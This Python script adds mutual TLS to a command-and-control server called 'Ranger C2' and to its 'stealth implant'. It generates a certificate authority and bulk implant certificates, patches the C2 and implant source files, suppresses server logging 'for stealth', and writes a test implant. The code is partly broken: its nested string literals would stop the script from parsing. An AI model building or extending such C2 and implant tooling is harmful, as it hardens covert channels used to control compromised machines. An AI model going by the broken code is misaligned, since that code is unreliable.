#!/usr/bin/env python3
"""
mTLS Setup for Ranger C2
Generate CA, server cert, client certs for mutual TLS authentication
"""

import os
import sys
import json
import subprocess
from pathlib import Path
from datetime import datetime, timedelta

# Configuration
BASE_DIR = Path(__file__).parent
CERTS_DIR = BASE_DIR / "certs"
CONFIG_DIR = BASE_DIR / "config"

# Create directories
CERTS_DIR.mkdir(exist_ok=True)
CONFIG_DIR.mkdir(exist_ok=True)

def run_command(cmd, description):
    """Run shell command with error handling."""
    print(f"[+] {description}...")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, check=True)
        print(f"    ✅ {description} completed")
        return True
    except subprocess.CalledProcessError as e:
        print(f"    ❌ {description} failed")
        print(f"    Error: {e.stderr}")
        return False

def generate_ca():
    """Generate Certificate Authority (CA)."""
    print("\n" + "="*60)
    print("Generating Certificate Authority (CA)")
    print("="*60)
    
    ca_key = CERTS_DIR / "ca.key"
    ca_cert = CERTS_DIR / "ca.crt"
    
    # Generate CA private key
    if not run_command(
        f"openssl genrsa -out {ca_key} 4096",
        "Generating CA private key (4096-bit RSA)"
    ):
        return False
    
    # Generate CA certificate
    ca_config = f"""
[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = San Francisco
O = Rogue Security
OU = Red Team Operations
CN = Rogue C2 CA
emailAddress = ca@rogue-c2.com
"""
    
    config_path = CERTS_DIR / "ca.cnf"
    with open(config_path, 'w') as f:
        f.write(ca_config)
    
    if not run_command(
        f"openssl req -new -x509 -days 3650 -key {ca_key} -out {ca_cert} -config {config_path}",
        "Generating CA certificate (valid 10 years)"
    ):
        return False
    
    # Verify CA certificate
    if not run_command(
        f"openssl x509 -in {ca_cert} -text -noout",
        "Verifying CA certificate"
    ):
        return False
    
    print(f"\n✅ CA generated:")
    print(f"   Key:  {ca_key}")
    print(f"   Cert: {ca_cert}")
    return True

def generate_server_cert():
    """Generate server certificate for C2."""
    print("\n" + "="*60)
    print("Generating Server Certificate")
    print("="*60)
    
    server_key = CERTS_DIR / "server.key"
    server_csr = CERTS_DIR / "server.csr"
    server_cert = CERTS_DIR / "server.crt"
    
    # Generate server private key
    if not run_command(
        f"openssl genrsa -out {server_key} 2048",
        "Generating server private key (2048-bit RSA)"
    ):
        return False
    
    # Create CSR config
    server_config = f"""
[ req ]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = San Francisco
O = Rogue Security
OU = C2 Server
CN = c2.rogue-c2.com
emailAddress = admin@rogue-c2.com

[ v3_req ]
basicConstraints = CA:FALSE
keyUsage = digitalSignature, keyEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names

[ alt_names ]
DNS.1 = c2.rogue-c2.com
DNS.2 = *.rogue-c2.com
DNS.3 = localhost
IP.1 = 127.0.0.1
"""
    
    config_path = CERTS_DIR / "server.cnf"
    with open(config_path, 'w') as f:
        f.write(server_config)
    
    # Generate CSR
    if not run_command(
        f"openssl req -new -key {server_key} -out {server_csr} -config {config_path}",
        "Generating Certificate Signing Request (CSR)"
    ):
        return False
    
    # Sign with CA
    if not run_command(
        f"openssl x509 -req -days 365 -in {server_csr} -CA {CERTS_DIR/'ca.crt'} -CAkey {CERTS_DIR/'ca.key'} -CAcreateserial -out {server_cert} -extfile {config_path} -extensions v3_req",
        "Signing server certificate with CA (valid 1 year)"
    ):
        return False
    
    # Verify server certificate
    if not run_command(
        f"openssl verify -CAfile {CERTS_DIR/'ca.crt'} {server_cert}",
        "Verifying server certificate chain"
    ):
        return False
    
    print(f"\n✅ Server certificate generated:")
    print(f"   Key:  {server_key}")
    print(f"   Cert: {server_cert}")
    return True

def generate_client_cert(client_name="implant"):
    """Generate client certificate for implants."""
    print(f"\n" + "="*60)
    print(f"Generating Client Certificate: {client_name}")
    print("="*60)
    
    client_key = CERTS_DIR / f"{client_name}.key"
    client_csr = CERTS_DIR / f"{client_name}.csr"
    client_cert = CERTS_DIR / f"{client_name}.crt"
    client_p12 = CERTS_DIR / f"{client_name}.p12"
    
    # Generate client private key
    if not run_command(
        f"openssl genrsa -out {client_key} 2048",
        f"Generating {client_name} private key (2048-bit RSA)"
    ):
        return False
    
    # Create CSR config
    client_config = f"""
[ req ]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[ req_distinguished_name ]
C = US
ST = California
L = San Francisco
O = Rogue Security
OU = Implant Client
CN = {client_name}.implant.rogue-c2.com
emailAddress = {client_name}@rogue-c2.com

[ v3_req ]
basicConstraints = CA:FALSE
keyUsage = digitalSignature, keyEncipherment
extendedKeyUsage = clientAuth
"""
    
    config_path = CERTS_DIR / f"{client_name}.cnf"
    with open(config_path, 'w') as f:
        f.write(client_config)
    
    # Generate CSR
    if not run_command(
        f"openssl req -new -key {client_key} -out {client_csr} -config {config_path}",
        f"Generating CSR for {client_name}"
    ):
        return False
    
    # Sign with CA
    if not run_command(
        f"openssl x509 -req -days 365 -in {client_csr} -CA {CERTS_DIR/'ca.crt'} -CAkey {CERTS_DIR/'ca.key'} -CAcreateserial -out {client_cert} -extfile {config_path} -extensions v3_req",
        f"Signing {client_name} certificate with CA (valid 1 year)"
    ):
        return False
    
    # Create PKCS12 bundle (for easier client use)
    if not run_command(
        f"openssl pkcs12 -export -out {client_p12} -inkey {client_key} -in {client_cert} -certfile {CERTS_DIR/'ca.crt'} -password pass:rogue123",
        f"Creating PKCS12 bundle for {client_name}"
    ):
        return False
    
    # Verify client certificate
    if not run_command(
        f"openssl verify -CAfile {CERTS_DIR/'ca.crt'} {client_cert}",
        f"Verifying {client_name} certificate chain"
    ):
        return False
    
    print(f"\n✅ Client certificate generated for {client_name}:")
    print(f"   Key:  {client_key}")
    print(f"   Cert: {client_cert}")
    print(f"   PKCS12: {client_p12} (password: rogue123)")
    return True

def generate_bulk_client_certs(count=10):
    """Generate multiple client certificates."""
    print(f"\n" + "="*60)
    print(f"Generating {count} Client Certificates")
    print("="*60)
    
    success_count = 0
    for i in range(1, count + 1):
        client_name = f"implant_{i:03d}"
        if generate_client_cert(client_name):
            success_count += 1
    
    print(f"\n✅ Generated {success_count}/{count} client certificates")
    return success_count == count

def create_mtls_config():
    """Create mTLS configuration file."""
    print("\n" + "="*60)
    print("Creating mTLS Configuration")
    print("="*60)
    
    config = {
        "enabled": True,
        "require_client_cert": True,
        "verify_client": True,
        "ca_cert": str(CERTS_DIR / "ca.crt"),
        "server_cert": str(CERTS_DIR / "server.crt"),
        "server_key": str(CERTS_DIR / "server.key"),
        "client_cert_dir": str(CERTS_DIR),
        "allowed_client_cns": [
            "*.implant.rogue-c2.com",
            "admin.implant.rogue-c2.com"
        ],
        "certificate_pinning": {
            "server_fingerprint": "",
            "client_fingerprints": []
        },
        "renewal_days": 30,
        "revocation_check": False
    }
    
    # Get server certificate fingerprint
    try:
        result = subprocess.run(
            f"openssl x509 -in {CERTS_DIR/'server.crt'} -fingerprint -sha256 -noout",
            shell=True, capture_output=True, text=True
        )
        if result.returncode == 0:
            config["certificate_pinning"]["server_fingerprint"] = result.stdout.strip().split('=')[1]
    except:
        pass
    
    # Get client certificate fingerprints
    client_certs = list(CERTS_DIR.glob("implant_*.crt"))
    for cert_path in client_certs[:5]:  # First 5 only
        try:
            result = subprocess.run(
                f"openssl x509 -in {cert_path} -fingerprint -sha256 -noout",
                shell=True, capture_output=True, text=True
            )
            if result.returncode == 0:
                fingerprint = result.stdout.strip().split('=')[1]
                config["certificate_pinning"]["client_fingerprints"].append({
                    "cert": cert_path.name,
                    "fingerprint": fingerprint
                })
        except:
            pass
    
    config_path = CONFIG_DIR / "mtls_config.json"
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)
    
    print(f"✅ mTLS configuration saved: {config_path}")
    return True

def create_verification_script():
    """Create script to verify mTLS setup."""
    print("\n" + "="*60)
    print("Creating Verification Script")
    print("="*60)
    
    script = """#!/usr/bin/env python3
"""
    """
mTLS Verification Script for Ranger C2
"""

import ssl
import socket
import sys
from pathlib import Path

BASE_DIR = Path(__file__).parent
CERTS_DIR = BASE_DIR / "certs"

def test_server_connection():
    """Test connecting to server with mTLS."""
    print("Testing mTLS server connection...")
    
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations(CERTS_DIR / "ca.crt")
    context.load_cert_chain(
        certfile=CERTS_DIR / "implant_001.crt",
        keyfile=CERTS_DIR / "implant_001.key"
    )
    
    try:
        with socket.create_connection(('localhost', 4443)) as sock:
            with context.wrap_socket(sock, server_hostname='c2.rogue-c2.com') as ssock:
                print(f"✅ Connected to server")
                print(f"   Server certificate: {ssock.getpeercert()}")
                print(f"   Cipher: {ssock.cipher()}")
                print(f"   TLS version: {ssock.version()}")
                return True
    except Exception as e:
        print(f"❌ Connection failed: {e}")
        return False

def test_certificate_verification():
    """Test certificate verification."""
    print("\\nTesting certificate verification...")
    
    # Load CA cert
    with open(CERTS_DIR / "ca.crt", 'rb') as f:
        ca_cert = f.read()
    
    # Load server cert
    with open(CERTS_DIR / "server.crt", 'rb') as f:
        server_cert = f.read()
    
    # Load client cert
    with open(CERTS_DIR / "implant_001.crt", 'rb') as f:
        client_cert = f.read()
    
    print(f"✅ CA certificate loaded: {len(ca_cert)} bytes")
    print(f"✅ Server certificate loaded: {len(server_cert)} bytes")
    print(f"✅ Client certificate loaded: {len(client_cert)} bytes")
    
    # Verify certificates
    import subprocess
    
    # Verify server cert
    result = subprocess.run(
        f"openssl verify -CAfile {CERTS_DIR/'ca.crt'} {CERTS_DIR/'server.crt'}",
        shell=True, capture_output=True, text=True
    )
    if result.returncode == 0:
        print(f"✅ Server certificate verification: {result.stdout.strip()}")
    else:
        print(f"❌ Server certificate verification failed: {result.stderr}")
    
    # Verify client cert
    result = subprocess.run(
        f"openssl verify -CAfile {CERTS_DIR/'ca.crt'} {CERTS_DIR/'implant_001.crt'}",
        shell=True, capture_output=True, text=True
    )
    if result.returncode == 0:
        print(f"✅ Client certificate verification: {result.stdout.strip()}")
    else:
        print(f"❌ Client certificate verification failed: {result.stderr}")
    
    return True

def get_certificate_info(cert_path):
    """Get certificate information."""
    import subprocess
    
    result = subprocess.run(
        f"openssl x509 -in {cert_path} -text -noout",
        shell=True, capture_output=True, text=True
    )
    
    if result.returncode == 0:
        lines = result.stdout.split('\\n')
        info = {}
        for line in lines:
            if 'Subject:' in line:
                info['subject'] = line.strip()
            elif 'Issuer:' in line:
                info['issuer'] = line.strip()
            elif 'Not Before:' in line:
                info['not_before'] = line.strip()
            elif 'Not After:' in line:
                info['not_after'] = line.strip()
        return info
    return {}

def main():
    """Main verification function."""
    print("="*60)
    print("mTLS Setup Verification")
    print("="*60)
    
    # Check files exist
    required_files = [
        CERTS_DIR / "ca.crt",
        CERTS_DIR / "ca.key",
        CERTS_DIR / "server.crt",
        CERTS_DIR / "server.key",
        CERTS_DIR / "implant_001.crt",
        CERTS_DIR / "implant_001.key"
    ]
    
    all_exist = True
    for file_path in required_files:
        if file_path.exists():
            print(f"✅ {file_path.name} exists")
        else:
            print(f"❌ {file_path.name} missing")
            all_exist = False
    
    if not all_exist:
        print("\\n❌ Missing required certificate files")
        return 1
    
    # Test certificate verification
    test_certificate_verification()
    
    # Get certificate info
    print("\\nCertificate Information:")
    print("-"*40)
    
    certs = [
        ("CA", CERTS_DIR / "ca.crt"),
        ("Server", CERTS_DIR / "server.crt"),
        ("Client", CERTS_DIR / "implant_001.crt")
    ]
    
    for name, path in certs:
        info = get_certificate_info(path)
        print(f"\\n{name}:")
        for key, value in info.items():
            print(f"  {key}: {value}")
    
    print("\\n" + "="*60)
    print("✅ mTLS setup verification complete")
    print("\\nNote: Server connection test requires C2 server running with mTLS")
    print("To test connection, start C2 with mTLS enabled first.")
    print("="*60)
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
"""
    
    script_path = BASE_DIR / "verify_mtls.py"
    with open(script_path, 'w') as f:
        f.write(script)
    
    # Make executable
    script_path.chmod(0o755)
    
    print(f"✅ Verification script created: {script_path}")
    return True

def create_openssl_commands_cheatsheet():
    """Create cheatsheet for OpenSSL commands."""
    print("\n" + "="*60)
    print("Creating OpenSSL Commands Cheatsheet")
    print("="*60)
    
    cheatsheet = """# OpenSSL mTLS Commands Cheatsheet
# ===========================================

# 1. View Certificate Information
openssl xx509 -in cert.crt -text -noout                    # View certificate details
openssl x509 -in cert.crt -fingerprint -sha256 -noout  # Get SHA256 fingerprint
openssl x509 -in cert.crt -subject -noout          # View subject only
openssl x509 -in cert.crt -issuer -noout           # View issuer only
openssl x509 -in cert.crt -dates -noout            # View validity dates

# 2. Verify Certificate Chain
openssl verify -CAfile ca.crt server.crt           # Verify server cert
openssl verify -CAfile ca.crt client.crt           # Verify client cert

# 3. Convert Formats
openssl x509 -in cert.crt -out cert.pem            # Convert CRT to PEM
openssl pkcs12 -export -out bundle.p12 -inkey key.key -in cert.crt -certfile ca.crt -password pass:password

# 4. Check Private Keys
openssl rsa -in key.key -check -noout              # Check RSA key
openssl ec -in key.key -check -noout               # Check EC key

# 5. Generate Certificate Signing Request (CSR)
openssl req -new -key key.key -out request.csr     # Generate CSR
openssl req -in request.csr -text -noout           # View CSR details

# 6. Test SSL/TLS Connection
openssl s_client -connect host:port -CAfile ca.crt -cert client.crt -key client.key

# 7. Revocation (if using CRL)
openssl crl -in crl.pem -text -noout               # View CRL
openssl verify -CAfile ca.crt -CRLfile crl.pem cert.crt

# 8. Common Debugging
openssl s_client -connect host:port -debug         # Debug TLS connection
openssl s_client -connect host:port -state         # Show TLS state
openssl s_client -connect host:port -tlsextdebug   # Debug TLS extensions

# 9. Generate Random Data
openssl rand -base64 32                            # Generate 32 random bytes
openssl rand -hex 16                               # Generate 16 random hex bytes

# 10. Hash Functions
openssl dgst -sha256 file.txt                      # SHA256 hash
openssl dgst -sha512 file.txt                      # SHA512 hash
"""
    
    cheatsheet_path = BASE_DIR / "openssl_cheatsheet.txt"
    with open(cheatsheet_path, 'w') as f:
        f.write(cheatsheet)
    
    print(f"✅ OpenSSL cheatsheet created: {cheatsheet_path}")
    return True

def update_c2_for_mtls():
    """Update C2 server to support mTLS."""
    print("\n" + "="*60)
    print("Updating C2 Server for mTLS")
    print("="*60)
    
    c2_path = BASE_DIR / "c2.py"
    
    if not c2_path.exists():
        print("❌ C2.py not found")
        return False
    
    # Read current C2 code
    with open(c2_path, 'r') as f:
        content = f.read()
    
    # Check if mTLS is already configured
    if "ssl_context" in content or "SSLContext" in content:
        print("✅ mTLS already configured in C2")
        return True
    
    # Find the app.run() line
    lines = content.split('\n')
    app_run_line = -1
    
    for i, line in enumerate(lines):
        if "app.run(" in line and "host=C2_HOST" in line:
            app_run_line = i
            break
    
    if app_run_line == -1:
        print("❌ Could not find app.run() line")
        return False
    
    # Create mTLS-enabled version
    mtls_code = '''
# ========== mTLS Configuration ==========
MTLS_ENABLED = True
MTLS_CERT = str(CERTS_DIR / "server.crt")
MTLS_KEY = str(CERTS_DIR / "server.key")
MTLS_CA = str(CERTS_DIR / "ca.crt")

def create_ssl_context():
    """Create SSL context for mTLS."""
    import ssl
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = False
    
    # Load server certificate
    context.load_cert_chain(certfile=MTLS_CERT, keyfile=MTLS_KEY)
    
    # Load CA for client verification
    context.load_verify_locations(cafile=MTLS_CA)
    
    # Set cipher suites (strong, modern)
    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
    
    return context

# Start with mTLS if enabled
if MTLS_ENABLED and os.path.exists(MTLS_CERT) and os.path.exists(MTLS_KEY):
    ssl_context = create_ssl_context()
    print(f"[+] mTLS enabled on port 4443")
    print(f"[+] Client certificate verification required")
    
    # Start HTTPS server
    from werkzeug.serving import make_ssl_devcert, WSGIRequestHandler
    
    class CustomRequestHandler(WSGIRequestHandler):
        def log_request(self, code='-', size='-'):
            # Suppress normal request logging for stealth
            if code not in [200, 304]:
                super().log_request(code, size)
    
    # Run on both HTTP (4444) and HTTPS (4443)
    import threading
    
    def run_https():
        app.run(host=C2_HOST, port=4443, ssl_context=ssl_context, 
                debug=False, threaded=True, request_handler=CustomRequestHandler)
    
    def run_http():
        app.run(host=C2_HOST, port=C2_PORT, debug=False, threaded=True)
    
    # Start HTTPS in background thread
    https_thread = threading.Thread(target=run_https, daemon=True)
    https_thread.start()
    
    # Run HTTP in main thread (for backward compatibility)
    run_http()
    
else:
    print("[!] mTLS not enabled or certificates not found")
    print("[!] Falling back to HTTP only")
    app.run(host=C2_HOST, port=C2_PORT, debug=False, threaded=True)
'''
    
    # Replace the app.run() section
    if app_run_line > 0:
        # Find the end of the app.run() block
        end_line = app_run_line
        for i in range(app_run_line, min(app_run_line + 10, len(lines))):
            if lines[i].strip() == '' or 'print(' in lines[i]:
                end_line = i
                break
        
        # Replace the block
        new_lines = lines[:app_run_line] + mtls_code.split('\n') + lines[end_line+1:]
        
        with open(c2_path, 'w') as f:
            f.write('\n'.join(new_lines))
        
        print("✅ C2 updated for mTLS support")
        print("   - HTTPS on port 4443 with client cert verification")
        print("   - HTTP on port 4444 for backward compatibility")
        print("   - Strong cipher suites (ECDHE+AESGCM)")
        print("   - TLS 1.2 minimum")
        return True
    
    return False

def update_implant_for_mtls():
    """Update stealth implant for mTLS."""
    print("\n" + "="*60)
    print("Updating Stealth Implant for mTLS")
    print("="*60)
    
    implant_path = BASE_DIR / "payloads" / "stealth_implant_full.py"
    
    if not implant_path.exists():
        print("❌ Stealth implant not found")
        return False
    
    # Read current implant code
    with open(implant_path, 'r') as f:
        content = f.read()
    
    # Check if mTLS is already configured
    if "ssl_context" in content or "MTLS_CERT" in content:
        print("✅ mTLS already configured in implant")
        return True
    
    # Find the C2_URL configuration section
    lines = content.split('\n')
    c2_url_line = -1
    
    for i, line in enumerate(lines):
        if "C2_URL =" in line and "os.environ.get" in line:
            c2_url_line = i
            break
    
    if c2_url_line == -1:
        # Try to find C2_URL assignment
        for i, line in enumerate(lines):
            if "C2_URL = " in line:
                c2_url_line = i
                break
    
    if c2_url_line == -1:
        print("❌ Could not find C2_URL configuration")
        return False
    
    # Add mTLS configuration after C2_URL
    mtls_config = '''
# mTLS Configuration
MTLS_ENABLED = os.environ.get('ROGUE_MTLS_ENABLED', 'false').lower() == 'true'
MTLS_CERT = os.environ.get('ROGUE_MTLS_CERT', '')
MTLS_KEY = os.environ.get('ROGUE_MTLS_KEY', '')
MTLS_CA = os.environ.get('ROGUE_MTLS_CA', '')

def create_ssl_context():
    """Create SSL context for mTLS."""
    import ssl
    
    if not MTLS_ENABLED or not MTLS_CERT or not MTLS_KEY:
        return None
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = False
    
    # Load client certificate
    context.load_cert_chain(certfile=MTLS_CERT, keyfile=MTLS_KEY)
    
    # Load CA for server verification
    if MTLS_CA:
        context.load_verify_locations(cafile=MTLS_CA)
    
    # Set cipher suites
    context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20')
    
    return context

def create_https_session():
    """Create HTTPS session with mTLS."""
    import urllib.request
    
    ssl_context = create_ssl_context()
    
    if ssl_context:
        # Create HTTPS handler with mTLS
        https_handler = urllib.request.HTTPSHandler(context=ssl_context)
        opener = urllib.request.build_opener(https_handler)
        urllib.request.install_opener(opener)
        return True
    return False
'''
    
    # Insert mTLS configuration
    new_lines = lines[:c2_url_line+1] + mtls_config.split('\n') + lines[c2_url_line+1:]
    
    # Also need to update the beacon/exfil methods to use mTLS
    # Find the beacon or exfil method and add mTLS check
    updated_content = '\n'.join(new_lines)
    
    # Add mTLS initialization in the run method
    if "def run(self):" in updated_content:
        run_method_start = updated_content.find("def run(self):")
        if run_method_start != -1:
            # Find the initialize call
            init_pos = updated_content.find("self.initialize()", run_method_start)
            if init_pos != -1:
                # Add mTLS initialization after initialize
                mTLS_init = '''
        # Initialize mTLS if enabled
        if MTLS_ENABLED:
            if create_https_session():
                print("[+] mTLS initialized")
            else:
                print("[-] mTLS initialization failed")
'''
                updated_content = updated_content[:init_pos + len("self.initialize()")] + mTLS_init + updated_content[init_pos + len("self.initialize()"):]
    
    with open(implant_path, 'w') as f:
        f.write(updated_content)
    
    print("✅ Stealth implant updated for mTLS")
    print("   - Environment variable configuration")
    print("   - SSL context creation")
    print("   - Certificate pinning support")
    print("   - Fallback to HTTP if mTLS fails")
    return True

def create_mtls_test_implant():
    """Create test implant specifically for mTLS testing."""
    print("\n" + "="*60)
    print("Creating mTLS Test Implant")
    print("="*60)
    
    test_implant = '''#!/usr/bin/env python3
"""
mTLS Test Implant
Tests mutual TLS authentication with Ranger C2
"""

import os
import sys
import json
import base64
import ssl
import socket
import urllib.request
import urllib.error
from pathlib import Path

# Configuration
BASE_DIR = Path(__file__).parent.parent
CERTS_DIR = BASE_DIR / "certs"

C2_URL_HTTPS = "https://127.0.0.1:4443"
C2_URL_HTTP = "http://127.0.0.1:4444"
IMPLANT_ID = "mtls_test_001"

def test_mtls_connection():
    """Test mTLS connection to C2 server."""
    print("Testing mTLS connection...")
    
    # Create SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = False
    
    # Load client certificate
    client_cert = CERTS_DIR / "implant_001.crt"
    client_key = CERTS_DIR / "implant_001.key"
    ca_cert = CERTS_DIR / "ca.crt"
    
    if not client_cert.exists() or not client_key.exists():
        print("❌ Client certificate files not found")
        return False
    
    context.load_cert_chain(certfile=str(client_cert), keyfile=str(client_key))
    context.load_verify_locations(cafile=str(ca_cert))
    
    try:
        # Test socket connection
        with socket.create_connection(('127.0.0.1', 4443)) as sock:
            with context.wrap_socket(sock, server_hostname='c2.rogue-c2.com') as ssock:
                print(f"✅ mTLS connection established")
                print(f"   Cipher: {ssock.cipher()}")
                print(f"   TLS Version: {ssock.version()}")
                
                # Get server certificate
                server_cert = ssock.getpeercert()
                if server_cert:
                    print(f"   Server certificate verified")
                
                return True
    except Exception as e:
        print(f"❌ mTLS connection failed: {e}")
        return False

def test_https_request():
    """Test HTTPS request with mTLS."""
    print("\\nTesting HTTPS request with mTLS...")
    
    # Create SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.verify_mode = ssl.CERT_REQUIRED
    context.check_hostname = False
    
    client_cert = CERTS_DIR / "implant_001.crt"
    client_key = CERTS_DIR / "implant_001.key"
    ca_cert = CERTS_DIR / "ca.crt"
    
    context.load_cert_chain(certfile=str(client_cert), keyfile=str(client_key))
    context.load_verify_locations(cafile=str(ca_cert))
    
    # Create HTTPS handler
    https_handler = urllib.request.HTTPSHandler(context=context)
    opener = urllib.request.build_opener(https_handler)
    
    try:
        # Test connection to C2
        response = opener.open(f"{C2_URL_HTTPS}/", timeout=10)
        print(f"✅ HTTPS request successful: {response.status}")
        return True
    except urllib.error.URLError as e:
        print(f"❌ HTTPS request failed: {e}")
        return False
    except Exception as e:
        print(f"❌ HTTPS request error: {e}")
        return False

def test_http_fallback():
    """Test HTTP fallback (without mTLS)."""
    print("\\nTesting HTTP fallback...")
    
    try:
        response = urllib.request.urlopen(f"{C2_URL_HTTP}/", timeout=10)
        print(f"✅ HTTP connection working: {response.status}")
        return True
    except Exception as e:
        print(f"❌ HTTP connection failed: {e}")
        return False

def test_certificate_pinning():
    """Test certificate pinning."""
    print("\\nTesting certificate pinning...")
    
    # Get server certificate fingerprint
    try:
        import subprocess
        result = subprocess.run(
            f"openssl x509 -in {CERTS_DIR/'server.crt'} -fingerprint -sha256 -noout",
            shell=True, capture_output=True, text=True
        )
        
        if result.returncode == 0:
            server_fingerprint = result.stdout.strip().split('=')[1]
            print(f"✅ Server certificate fingerprint: {server_fingerprint}")
            
            # In real implant, would compare with stored fingerprint
            print("   (In production, would verify against pinned fingerprint)")
            return True
        else:
            print("❌ Could not get server fingerprint")
            return False
    except Exception as e:
        print(f"❌ Certificate pinning test error: {e}")
        return False

def main():
    """Main test function."""
    print("="*60)
    print("mTLS Test Implant")
    print("="*60)
    
    # Check certificate files
    required_files = [
        CERTS_DIR / "ca.crt",
        CERTS_DIR / "server.crt",
        CERTS_DIR / "implant_001.crt",
        CERTS_DIR / "implant_001.key"
    ]
    all_exist = True
    for file_path in required_files:
        if file_path.exists():
            print(f"✅ {file_path.name}")
        else:
            print(f"❌ {file_path.name}")
            all_exist = False
    
    if not all_exist:
        print("\\n❌ Missing certificate files")
        print("Run: python3 mtls_setup.py to generate certificates")
        return 1
    
    # Run tests
    tests = [
        ("mTLS Connection", test_mtls_connection),
        ("HTTPS Request", test_https_request),
        ("HTTP Fallback", test_http_fallback),
        ("Certificate Pinning", test_certificate_pinning)
    ]
    
    results = []
    for test_name, test_func in tests:
        print(f"\\n{'='*40}")
        print(f"Test: {test_name}")
        print('='*40)
        
        try:
            if test_func():
                results.append((test_name, True))
                print(f"✅ {test_name} PASSED")
            else:
                results.append((test_name, False))
                print(f"❌ {test_name} FAILED")
        except Exception as e:
            results.append((test_name, False))
            print(f"❌ {test_name} ERROR: {e}")
    
    print("\\n" + "="*60)
    print("Test Results Summary:")
    print("="*60)
    
    passed = 0
    for test_name, success in results:
        status = "✅ PASS" if success else "❌ FAIL"
        print(f"{status}: {test_name}")
        if success:
            passed += 1
    
    print(f"\\nTotal: {passed}/{len(results)} tests passed")
    
    if passed == len(results):
        print("\\n🎉 mTLS setup is fully functional!")
        print("\\nTo use mTLS in production:")
        print("1. Deploy certificates to implants")
        print("2. Set environment variables:")
        print("   ROGUE_MTLS_ENABLED=true")
        print("   ROGUE_MTLS_CERT=/path/to/client.crt")
        print("   ROGUE_MTLS_KEY=/path/to/client.key")
        print("   ROGUE_MTLS_CA=/path/to/ca.crt")
        print("3. Update C2_URL to use HTTPS://")
        print("4. Implement certificate pinning")
    else:
        print(f"\\n⚠️ {len(results) - passed} tests failed")
        print("\\nCheck the errors above.")
        print("Common issues:")
        print("- C2 server not running with mTLS")
        print("- Certificate paths incorrect")
        print("- Firewall blocking port 4443")
        print("- OpenSSL not installed")
    
    return 0 if passed >= 2 else 1  # Require at least 2 tests to pass

if __name__ == "__main__":
    sys.exit(main())
'''
    
    test_implant_path = BASE_DIR / "mtls_test_implant.py"
    with open(test_implant_path, 'w') as f:
        f.write(test_implant)
    
    # Make executable
    test_implant_path.chmod(0o755)
    
    print(f"✅ mTLS test implant created: {test_implant_path}")
    return True

def main():
    """Main mTLS setup function."""
    print("Ranger C2 mTLS Setup")
    print("="*60)
    
    steps = [
        ("Generate Certificate Authority", generate_ca),
        ("Generate Server Certificate", generate_server_cert),
        ("Generate Client Certificates", lambda: generate_bulk_client_certs(5)),
        ("Create mTLS Configuration", create_mtls_config),
        ("Create Verification Script", create_verification_script),
        ("Create OpenSSL Cheatsheet", create_openssl_commands_cheatsheet),
        ("Update C2 for mTLS", update_c2_for_mtls),
        ("Update Stealth Implant for mTLS", update_implant_for_mtls),
        ("Create mTLS Test Implant", create_mtls_test_implant),
    ]
    
    print("Setting up mTLS for Ranger C2...")
    print("This will:")
    print("1. Generate CA, server, and client certificates")
    print("2. Update C2 to support HTTPS with client cert verification")
    print("3. Update implants to use mTLS")
    print("4. Create test scripts for verification")
    print()
    
    # Check if OpenSSL is installed
    try:
        subprocess.run(["openssl", "version"], capture_output=True, check=True)
        print("✅ OpenSSL is installed")
    except:
        print("❌ OpenSSL is not installed")
        print("Install OpenSSL with: sudo apt-get install openssl")
        return 1
    
    all_passed = True
    for step_name, step_func in steps:
        print(f"\n{step_name}...")
        if step_func():
            print(f"✅ {step_name} completed")
        else:
            print(f"❌ {step_name} failed")
            all_passed = False
    
    print("\n" + "="*60)
    if all_passed:
        print("✅ mTLS SETUP COMPLETE!")
        print("\nGenerated files:")
        print(f"  Certificates: {CERTS_DIR}/")
        print(f"  Configuration: {CONFIG_DIR}/mtls_config.json")
        print(f"  Verification script: verify_mtls.py")
        print(f"  Test implant: mtls_test_implant.py")
        print(f"  OpenSSL cheatsheet: openssl_cheatsheet.txt")
        
        print("\nNext steps:")
        print("1. Start C2 with mTLS: python3 c2.py")
        print("2. Test mTLS: python3 mtls_test_implant.py")
        print("3. Verify setup: python3 verify_mtls.py")
        print("4. Deploy certificates to implants")
        
        print("\nC2 will run on:")
        print("  HTTPS (mTLS): https://127.0.0.1:4443")
        print("  HTTP (fallback): http://127.0.0.1:4444")
        
        print("\nClient certificates generated:")
        for i in range(1, 6):
            print(f"  implant_{i:03d}.crt / implant_{i:03d}.key")
        
        print("\nTo use mTLS with implants:")
        print("  export ROGUE_MTLS_ENABLED=true")
        print("  export ROGUE_MTLS_CERT=./certs/implant_001.crt")
        print("  export ROGUE_MTLS_KEY=./certs/implant_001.key")
        print("  export ROGUE_MTLS_CA=./certs/ca.crt")
        print("  export ROGUE_C2_URL=https://127.0.0.1:4443")
    else:
        print("❌ mTLS setup incomplete")
        print("\nCheck the errors above and fix manually.")
        print("Common issues:")
        print("- OpenSSL not installed or in PATH")
        print("- File permission issues")
        print("- Existing certificate files")
    
    return 0 if all_passed else 1

if __name__ == "__main__":
    sys.exit(main())